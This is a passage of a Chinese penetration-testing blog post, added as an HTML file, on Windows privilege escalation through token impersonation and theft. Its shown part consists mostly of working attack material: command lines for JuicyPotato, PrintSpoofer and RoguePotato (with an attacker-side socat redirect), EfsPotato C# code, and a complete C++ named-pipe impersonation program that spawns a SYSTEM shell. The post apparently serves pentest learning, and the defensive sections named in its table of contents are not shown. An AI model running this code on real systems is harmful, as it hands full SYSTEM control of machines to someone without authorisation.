@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Windows 令牌窃取与模拟提权全流程。深入分析 SeImpersonatePrivilege &#x2F; SeAssignPrimaryToken &#x2F; SeDebugPrivilege，详解 Potato 家族（PrintSpoofer、RoguePotato、EfsPotato、JuicyPotato）、命名管道模拟、LSASS 令牌窃取、Meterpreter getsystem 内部机制。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权：令牌窃取与模拟">
+<meta property="og:url" content="https://congliang.github.io/Windows-privesc-token/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="Windows 令牌窃取与模拟提权全流程。深入分析 SeImpersonatePrivilege &#x2F; SeAssignPrimaryToken &#x2F; SeDebugPrivilege，详解 Potato 家族（PrintSpoofer、RoguePotato、EfsPotato、JuicyPotato）、命名管道模拟、LSASS 令牌窃取、Meterpreter getsystem 内部机制。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:46.014Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Windows-privesc-token/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Windows-privesc-token/","path":"Windows-privesc-token/","title":"Windows提权：令牌窃取与模拟"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Windows提权：令牌窃取与模拟 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Windows-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">一、Windows 访问令牌基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF%E6%80%BB%E8%A7%88"><span class="nav-number">2.</span> <span class="nav-text">二、攻击链路总览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Potato-%E5%AE%B6%E6%97%8F%EF%BC%9ASeImpersonatePrivilege-%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">三、Potato 家族：SeImpersonatePrivilege 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 核心原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E5%B7%A5%E5%85%B7%E5%AF%B9%E6%AF%94"><span class="nav-number">3.2.</span> <span class="nav-text">3.2 工具对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E6%A8%A1%E6%8B%9F"><span class="nav-number">4.</span> <span class="nav-text">四、命名管道模拟</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%8E%9F%E7%90%86"><span class="nav-number">4.1.</span> <span class="nav-text">4.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-C-%E5%AE%9E%E7%8E%B0"><span class="nav-number">4.2.</span> <span class="nav-text">4.2 C++ 实现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81SeAssignPrimaryTokenPrivilege-%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">五、SeAssignPrimaryTokenPrivilege 利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81SeDebugPrivilege-%E2%80%94%E2%80%94-LSASS-winlogon-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="nav-number">6.</span> <span class="nav-text">六、SeDebugPrivilege —— LSASS &#x2F; winlogon 令牌窃取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E5%8E%9F%E7%90%86"><span class="nav-number">6.1.</span> <span class="nav-text">6.1 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-C-%E5%AE%8C%E6%95%B4%E5%AE%9E%E7%8E%B0"><span class="nav-number">6.2.</span> <span class="nav-text">6.2 C++ 完整实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-mimikatz-Incognito-%E6%93%8D%E4%BD%9C"><span class="nav-number">6.3.</span> <span class="nav-text">6.3 mimikatz &#x2F; Incognito 操作</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81Meterpreter-getsystem-%E5%86%85%E9%83%A8%E6%9C%BA%E5%88%B6"><span class="nav-number">7.</span> <span class="nav-text">七、Meterpreter getsystem 内部机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E4%B8%89%E7%A7%8D%E6%8A%80%E6%9C%AF"><span class="nav-number">7.1.</span> <span class="nav-text">7.1 三种技术</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E5%86%85%E9%83%A8%E6%B5%81%E7%A8%8B"><span class="nav-number">7.2.</span> <span class="nav-text">7.2 内部流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%98%B2%E5%BE%A1%E4%B8%8E%E6%A3%80%E6%B5%8B"><span class="nav-number">8.</span> <span class="nav-text">八、防御与检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E5%85%B3%E9%94%AE%E6%A3%80%E6%B5%8B%E6%8C%87%E6%A0%87"><span class="nav-number">8.1.</span> <span class="nav-text">8.1 关键检测指标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E5%8A%A0%E5%9B%BA%E6%8E%AA%E6%96%BD"><span class="nav-number">8.2.</span> <span class="nav-text">8.2 加固措施</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-3-%E5%85%B3%E9%94%AE%E4%BA%8B%E4%BB%B6-ID"><span class="nav-number">8.3.</span> <span class="nav-text">8.3 关键事件 ID</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">九、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%BA%90"><span class="nav-number">10.</span> <span class="nav-text">参考资源</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-token/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Windows提权：令牌窃取与模拟 | 渗透测试实战记录">
+      <meta itemprop="description" content="Windows 令牌窃取与模拟提权全流程。深入分析 SeImpersonatePrivilege &#x2F; SeAssignPrimaryToken &#x2F; SeDebugPrivilege，详解 Potato 家族（PrintSpoofer、RoguePotato、EfsPotato、JuicyPotato）、命名管道模拟、LSASS 令牌窃取、Meterpreter getsystem 内部机制。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Windows提权：令牌窃取与模拟
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-01 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-01T08:00:00+08:00">2025-01-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">Windows 令牌窃取与模拟提权全流程。深入分析 SeImpersonatePrivilege / SeAssignPrimaryToken / SeDebugPrivilege，详解 Potato 家族（PrintSpoofer、RoguePotato、EfsPotato、JuicyPotato）、命名管道模拟、LSASS 令牌窃取、Meterpreter getsystem 内部机制。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>环境：Windows 10 &#x2F; 11、Windows Server 2016 &#x2F; 2019 &#x2F; 2022。部分技术需管理员权限或对应特权。</p>
+</blockquote>
+<hr>
+<h2 id="一、Windows-访问令牌基础"><a href="#一、Windows-访问令牌基础" class="headerlink" title="一、Windows 访问令牌基础"></a>一、Windows 访问令牌基础</h2><p>访问令牌是描述进程或线程安全上下文的内核对象：</p>
+<table>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Primary Token</strong></td>
+<td>进程的主令牌，决定其安全上下文</td>
+</tr>
+<tr>
+<td><strong>Impersonation Token</strong></td>
+<td>线程临时模拟某一用户时使用的令牌</td>
+</tr>
+<tr>
+<td><strong>Privileges</strong></td>
+<td>令牌持有的特权列表</td>
+</tr>
+</tbody></table>
+<p>本攻击面涉及三项核心特权：</p>
+<table>
+<thead>
+<tr>
+<th>特权</th>
+<th>典型持有者</th>
+<th>攻击价值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SeImpersonatePrivilege</code></td>
+<td>IIS、MSSQL 等服务账户</td>
+<td>模拟连接客户端的令牌</td>
+</tr>
+<tr>
+<td><code>SeAssignPrimaryTokenPrivilege</code></td>
+<td>SYSTEM、LocalService</td>
+<td>为进程分配主令牌</td>
+</tr>
+<tr>
+<td><code>SeDebugPrivilege</code></td>
+<td>管理员（需手动启用）</td>
+<td>打开任意进程、复制其令牌</td>
+</tr>
+</tbody></table>
+<p>检查特权：<code>whoami /priv</code></p>
+<hr>
+<h2 id="二、攻击链路总览"><a href="#二、攻击链路总览" class="headerlink" title="二、攻击链路总览"></a>二、攻击链路总览</h2><pre class="mermaid">flowchart LR
+    A[WebShell / 低权限 Shell] --> B{whoami /priv}
+    B -->|SeImpersonatePrivilege| C[Potato 家族 / 命名管道模拟]
+    B -->|SeDebugPrivilege| D[窃取 winlogon 令牌]
+    B -->|SeAssignPrimaryTokenPrivilege| E[令牌复制 + CreateProcessAsUser]
+    C & D & E --> F[SYSTEM Shell]</pre>
+
+<hr>
+<h2 id="三、Potato-家族：SeImpersonatePrivilege-利用"><a href="#三、Potato-家族：SeImpersonatePrivilege-利用" class="headerlink" title="三、Potato 家族：SeImpersonatePrivilege 利用"></a>三、Potato 家族：SeImpersonatePrivilege 利用</h2><h3 id="3-1-核心原理"><a href="#3-1-核心原理" class="headerlink" title="3.1 核心原理"></a>3.1 核心原理</h3><p>服务账户持有 <code>SeImpersonatePrivilege</code> → 通过 COM &#x2F; RPC 诱使 SYSTEM 向攻击者监听端口发起 NTLM 认证 → 完成 NTLM 协商后调用 <code>ImpersonateSecurityContext</code> 获得 SYSTEM 模拟令牌 → 使用该令牌创建 SYSTEM 进程。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">攻击者 (低权限)                         SYSTEM 进程</span><br><span class="line">    │                                      │</span><br><span class="line">    │ ① 创建监听端口 / 命名管道              │</span><br><span class="line">    │ ② 触发 RPC/COM 使 SYSTEM 发起认证     │</span><br><span class="line">    │ ← ← ← ← SYSTEM NTLM 认证 ← ← ← ← ← │</span><br><span class="line">    │ ③ AcceptSecurityContext 完成握手       │</span><br><span class="line">    │ ④ ImpersonateSecurityContext 获得令牌 │</span><br><span class="line">    │ ⑤ DuplicateTokenEx + CreateProcessAsUser</span><br><span class="line">    ▾</span><br><span class="line">  SYSTEM Shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-工具对比"><a href="#3-2-工具对比" class="headerlink" title="3.2 工具对比"></a>3.2 工具对比</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>原理</th>
+<th>有效版本</th>
+<th>特性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>JuicyPotato</strong></td>
+<td>DCOM + BITS CLSID</td>
+<td>Win7 ~ 10 1607, Svr2016</td>
+<td>经典，需有效 CLSID</td>
+</tr>
+<tr>
+<td><strong>RoguePotato</strong></td>
+<td>OXID 解析器劫持</td>
+<td>Win10 1809+, Svr2019+</td>
+<td>需远程攻击机辅助</td>
+</tr>
+<tr>
+<td><strong>PrintSpoofer</strong></td>
+<td>Spooler 命名管道</td>
+<td>Win10, Svr2019&#x2F;2022</td>
+<td>纯本地利用</td>
+</tr>
+<tr>
+<td><strong>EfsPotato</strong></td>
+<td>MS-EFSR RPC</td>
+<td>Win10, Svr2019&#x2F;2022</td>
+<td>纯本地利用</td>
+</tr>
+<tr>
+<td><strong>GodPotato</strong></td>
+<td>DCOM + 多管道</td>
+<td>Win10+, Svr2012~2022</td>
+<td>最新，兼容性最广</td>
+</tr>
+</tbody></table>
+<p><strong>JuicyPotato：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t * -p cmd.exe -l 1337</span><br><span class="line"><span class="comment"># -t: t=CreateProcessWithToken, u=CreateProcessAsUser, *=两者</span></span><br><span class="line"><span class="comment"># -p: 程序路径, -l: 监听端口, -c: COM CLSID</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>PrintSpoofer：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrintSpoofer.exe -i -c cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><strong>RoguePotato：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机: socat TCP-LISTEN:135,reuseaddr,fork TCP:目标IP:9999</span></span><br><span class="line">RoguePotato.exe -r 攻击者IP -e <span class="string">&quot;cmd.exe&quot;</span> -l 9999</span><br></pre></td></tr></table></figure>
+
+<p><strong>EfsPotato 核心代码（C#）：</strong></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">var</span> pipe = <span class="keyword">new</span> NamedPipeServerStream(<span class="string">&quot;testpipe&quot;</span>,</span><br><span class="line">    PipeDirection.InOut, <span class="number">1</span>, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);</span><br><span class="line">EfsRpcTrigger(pipe.SafePipeHandle.DangerousGetHandle());</span><br><span class="line">pipe.WaitForConnection();</span><br><span class="line">pipe.RunAsClient(() =&gt; &#123; Process.Start(<span class="string">&quot;cmd.exe&quot;</span>); &#125;);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、命名管道模拟"><a href="#四、命名管道模拟" class="headerlink" title="四、命名管道模拟"></a>四、命名管道模拟</h2><h3 id="4-1-原理"><a href="#4-1-原理" class="headerlink" title="4.1 原理"></a>4.1 原理</h3><p>持有 <code>SeImpersonatePrivilege</code> 的进程创建命名管道，当高权限客户端连接时调用 <code>ImpersonateNamedPipeClient</code> 获取客户端令牌。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击者                                SYSTEM 进程</span><br><span class="line">  │                                      │</span><br><span class="line">  │ CreateNamedPipe(&quot;\\.\pipe\evil&quot;)      │</span><br><span class="line">  │ 触发 RPC (EFS/Spooler/BITS)           │</span><br><span class="line">  │ ← ← ← ← SYSTEM 连接管道 ← ← ← ← ← ←│</span><br><span class="line">  │ ImpersonateNamedPipeClient            │</span><br><span class="line">  │ DuplicateTokenEx + CreateProcessAsUser</span><br><span class="line">  ▾</span><br><span class="line">SYSTEM Shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-C-实现"><a href="#4-2-C-实现" class="headerlink" title="4.2 C++ 实现"></a>4.2 C++ 实现</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE hPipe = <span class="built_in">CreateNamedPipeA</span>(<span class="string">&quot;\\\\.\\pipe\\privpipe&quot;</span>,</span><br><span class="line">        PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, <span class="number">1</span>, <span class="number">2048</span>, <span class="number">2048</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ConnectNamedPipe</span>(hPipe, <span class="literal">NULL</span>) || <span class="built_in">GetLastError</span>() == ERROR_PIPE_CONNECTED) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ImpersonateNamedPipeClient</span>(hPipe)) &#123;</span><br><span class="line">            HANDLE hToken;</span><br><span class="line">            <span class="built_in">OpenThreadToken</span>(<span class="built_in">GetCurrentThread</span>(), TOKEN_ALL_ACCESS, FALSE, &amp;hToken);</span><br><span class="line">            STARTUPINFO si = &#123; <span class="built_in">sizeof</span>(si) &#125;; PROCESS_INFORMATION pi;</span><br><span class="line">            <span class="built_in">CreateProcessWithTokenW</span>(hToken, <span class="number">0</span>, <span class="string">L&quot;cmd.exe&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] SYSTEM Shell PID: %d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">            <span class="built_in">RevertToSelf</span>(); <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DisconnectNamedPipe</span>(hPipe); <span class="built_in">CloseHandle</span>(hPipe);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="五、SeAssignPrimaryTokenPrivilege-利用"><a href="#五、SeAssignPrimaryTokenPrivilege-利用" class="headerlink" title="五、SeAssignPrimaryTokenPrivilege 利用"></a>五、SeAssignPrimaryTokenPrivilege 利用</h2><p>将模拟令牌通过 <code>DuplicateTokenEx(TokenPrimary)</code> 提升为主令牌，再用 <code>CreateProcessAsUser</code> 分配。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hImpersonationToken; <span class="comment">// 通过 Potato/管道获得</span></span><br><span class="line">HANDLE hPrimaryToken;</span><br><span class="line"></span><br><span class="line"><span class="built_in">DuplicateTokenEx</span>(hImpersonationToken, TOKEN_ALL_ACCESS, <span class="literal">NULL</span>,</span><br><span class="line">    SecurityImpersonation, TokenPrimary, &amp;hPrimaryToken);</span><br><span class="line"></span><br><span class="line">STARTUPINFOW si = &#123; <span class="built_in">sizeof</span>(si) &#125;; PROCESS_INFORMATION pi;</span><br><span class="line"><span class="built_in">CreateProcessAsUserW</span>(hPrimaryToken, <span class="literal">NULL</span>, <span class="string">L&quot;cmd.exe&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_NEW_CONSOLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、SeDebugPrivilege-——-LSASS-winlogon-令牌窃取"><a href="#六、SeDebugPrivilege-——-LSASS-winlogon-令牌窃取" class="headerlink" title="六、SeDebugPrivilege —— LSASS &#x2F; winlogon 令牌窃取"></a>六、SeDebugPrivilege —— LSASS &#x2F; winlogon 令牌窃取</h2><h3 id="6-1-原理"><a href="#6-1-原理" class="headerlink" title="6.1 原理"></a>6.1 原理</h3><p><code>SeDebugPrivilege</code> 允许打开任意 SYSTEM 进程。流程：启用特权 → 打开 <code>winlogon.exe</code> → 获取令牌 → 复制 → 以 SYSTEM 启动进程。</p>
